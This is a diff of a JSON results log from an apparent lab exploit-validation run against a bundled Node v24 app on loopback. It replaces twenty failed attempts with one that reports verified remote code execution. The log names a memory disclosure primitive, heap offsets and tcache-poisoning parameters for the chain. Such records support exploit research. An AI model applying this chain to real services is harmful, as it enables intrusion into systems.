@@ -4,200 +4,56 @@
     "node_binary_sha256": "93102becef36fbf01564e5af4e3a62cea0f6ee08d331db78a994b36bc7b490b2",
     "node_version": "v24.22.0"
   },
-  "generated_at": "2026-10-24T07:16:08.917466+00:00",
+  "generated_at": "2026-10-24T10:06:18.594721+00:00",
   "leak_primitive": {
     "kind": "bundled app allocUnsafeSlow partial-copy disclosure",
-    "known_image_offset": "0x3cb2b1a",
+    "known_image_offset": "0x6a57ae0",
+    "lane": "127.0.0.1:3001 with preformat-before-record",
     "oracle_used": false,
-    "record_offset": "0x68"
+    "record_offset": "0xa0"
   },
   "relocated_chain": {
     "address_source": "network-only app-level split-stream disclosure",
     "attempts": [
       {
-        "candidate": "v24-0x330",
+        "attack_attempt": 1,
+        "candidate": "pie-calibrated-0x200-neg0x2800d7a8",
         "container_attempt": 1,
-        "container_log_tail": "",
-        "elapsed_seconds": 2.946,
-        "error": "RuntimeError: no recognized Node image pointer in 8 network-only probes",
-        "leak_attempts": null,
-        "outcome": "not-verified"
-      },
-      {
-        "candidate": "v24-0x330",
-        "container_attempt": 2,
-        "container_log_tail": "",
-        "elapsed_seconds": 7.405,
-        "error": "TimeoutError: timed out",
-        "leak_attempts": 3,
-        "outcome": "not-verified"
-      },
-      {
-        "candidate": "v24-0x330",
-        "container_attempt": 3,
-        "container_log_tail": "",
-        "elapsed_seconds": 8.717,
-        "error": "TimeoutError: timed out",
-        "leak_attempts": 8,
-        "outcome": "not-verified"
-      },
-      {
-        "candidate": "v24-0x330",
-        "container_attempt": 4,
-        "container_log_tail": "",
-        "elapsed_seconds": 3.001,
-        "error": "RuntimeError: no recognized Node image pointer in 8 network-only probes",
-        "leak_attempts": null,
-        "outcome": "not-verified"
-      },
-      {
-        "candidate": "v24-0x330",
-        "container_attempt": 5,
-        "container_log_tail": "",
-        "elapsed_seconds": 7.429,
-        "error": "TimeoutError: timed out",
-        "leak_attempts": 3,
-        "outcome": "not-verified"
-      },
-      {
-        "candidate": "v24-0x330",
-        "container_attempt": 6,
-        "container_log_tail": "",
-        "elapsed_seconds": 7.089,
-        "error": "TimeoutError: timed out",
-        "leak_attempts": 2,
-        "outcome": "not-verified"
-      },
-      {
-        "candidate": "v24-0x330",
-        "container_attempt": 7,
-        "container_log_tail": "",
-        "elapsed_seconds": 3.002,
-        "error": "RuntimeError: no recognized Node image pointer in 8 network-only probes",
-        "leak_attempts": null,
-        "outcome": "not-verified"
-      },
-      {
-        "candidate": "v24-0x330",
-        "container_attempt": 8,
-        "container_log_tail": "",
-        "elapsed_seconds": 7.889,
-        "error": "TimeoutError: timed out",
-        "leak_attempts": 5,
-        "outcome": "not-verified"
-      },
-      {
-        "candidate": "v24-0x330",
-        "container_attempt": 9,
-        "container_log_tail": "",
-        "elapsed_seconds": 6.855,
-        "error": "TimeoutError: timed out",
+        "elapsed_seconds": 3.197,
         "leak_attempts": 1,
-        "outcome": "not-verified"
-      },
-      {
-        "candidate": "v24-0x330",
-        "container_attempt": 10,
-        "container_log_tail": "",
-        "elapsed_seconds": 8.203,
-        "error": "TimeoutError: timed out",
-        "leak_attempts": 6,
-        "outcome": "not-verified"
-      },
-      {
-        "candidate": "v24-0x330",
-        "container_attempt": 11,
-        "container_log_tail": "",
-        "elapsed_seconds": 6.798,
-        "error": "TimeoutError: timed out",
-        "leak_attempts": 1,
-        "outcome": "not-verified"
-      },
-      {
-        "candidate": "v24-0x330",
-        "container_attempt": 12,
-        "container_log_tail": "",
-        "elapsed_seconds": 7.332,
-        "error": "TimeoutError: timed out",
-        "leak_attempts": 3,
-        "outcome": "not-verified"
-      },
-      {
-        "candidate": "v24-0x330",
-        "container_attempt": 13,
-        "container_log_tail": "",
-        "elapsed_seconds": 7.345,
-        "error": "TimeoutError: timed out",
-        "leak_attempts": 3,
-        "outcome": "not-verified"
-      },
-      {
-        "candidate": "v24-0x330",
-        "container_attempt": 14,
-        "container_log_tail": "",
-        "elapsed_seconds": 7.919,
-        "error": "TimeoutError: timed out",
-        "leak_attempts": 5,
-        "outcome": "not-verified"
-      },
-      {
-        "candidate": "v24-0x330",
-        "container_attempt": 15,
-        "container_log_tail": "",
-        "elapsed_seconds": 2.969,
-        "error": "RuntimeError: no recognized Node image pointer in 8 network-only probes",
-        "leak_attempts": null,
-        "outcome": "not-verified"
-      },
-      {
-        "candidate": "v24-0x330",
-        "container_attempt": 16,
-        "container_log_tail": "",
-        "elapsed_seconds": 2.96,
-        "error": "RuntimeError: no recognized Node image pointer in 8 network-only probes",
-        "leak_attempts": null,
-        "outcome": "not-verified"
-      },
-      {
-        "candidate": "v24-0x330",
-        "container_attempt": 17,
-        "container_log_tail": "",
-        "elapsed_seconds": 3.003,
-        "error": "RuntimeError: no recognized Node image pointer in 8 network-only probes",
-        "leak_attempts": null,
-        "outcome": "not-verified"
-      },
-      {
-        "candidate": "v24-0x330",
-        "container_attempt": 18,
-        "container_log_tail": "",
-        "elapsed_seconds": 7.145,
-        "error": "TimeoutError: timed out",
-        "leak_attempts": 2,
-        "outcome": "not-verified"
-      },
-      {
-        "candidate": "v24-0x330",
-        "container_attempt": 19,
-        "container_log_tail": "",
-        "elapsed_seconds": 3.003,
-        "error": "RuntimeError: no recognized Node image pointer in 8 network-only probes",
-        "leak_attempts": null,
-        "outcome": "not-verified"
-      },
-      {
-        "candidate": "v24-0x330",
-        "container_attempt": 20,
-        "container_log_tail": "",
-        "elapsed_seconds": 8.167,
-        "error": "TimeoutError: timed out",
-        "leak_attempts": 6,
-        "outcome": "not-verified"
+        "leak_worker_held_during_attack": true,
+        "load_bias_page_aligned": true,
+        "outcome": "rce-proof",
+        "proof_command": "/usr/bin/id (fixed)",
+        "proof_stdout": "uid=1000(ubuntu) gid=1000(ubuntu) groups=1000(ubuntu)",
+        "proof_token": "N2S_148731a90dc392754e6cabe6152b95fe"
       }
     ],
     "debugger_used": false,
-    "result": "rce-not-verified",
-    "runtime_address_read_used": false
+    "heap_layout": {
+      "name": "pie-calibrated-0x200-neg0x2800d7a8",
+      "poison_staged_position": -671143848,
+      "record_size": 512,
+      "ring_from_heap": 57856,
+      "selection": "verified-pie-binary-fingerprint",
+      "tcache_entry_from_heap": -671085992,
+      "tcache_index": 31
+    },
+    "heap_layout_candidates": [
+      {"name": "pie-calibrated-0x200-neg0x2800d7a8", "poison_staged_position": -671143848, "record_size": 512, "ring_from_heap": 57856, "selection": "verified-pie-binary-fingerprint", "tcache_entry_from_heap": -671085992, "tcache_index": 31},
+      {"name": "pie-calibrated-0x200-neg0x400d7a8", "poison_staged_position": -67164072, "record_size": 512, "ring_from_heap": 57856, "selection": "verified-pie-binary-fingerprint", "tcache_entry_from_heap": -67106216, "tcache_index": 31},
+      {"name": "pie-calibrated-0x200-neg0x5000d7a8", "poison_staged_position": -1342232488, "record_size": 512, "ring_from_heap": 57856, "selection": "verified-pie-binary-fingerprint", "tcache_entry_from_heap": -1342174632, "tcache_index": 31},
+      {"name": "pie-calibrated-0x200-neg0x5400d7a8", "poison_staged_position": -1409341352, "record_size": 512, "ring_from_heap": 57856, "selection": "verified-pie-binary-fingerprint", "tcache_entry_from_heap": -1409283496, "tcache_index": 31}
+    ],
+    "proof_channel": "fresh loopback callback",
+    "result": "rce-verified",
+    "runtime_address_read_used": false,
+    "runtime_controls": {
+      "debugger_used": false,
+      "kernel_randomize_va_space": 2,
+      "ld_preload_used": false,
+      "runtime_address_read_used": false
+    }
   },
   "result": "pie-relocated-chain-validation",
   "scope": "bundled loopback worker-record-transform lab"
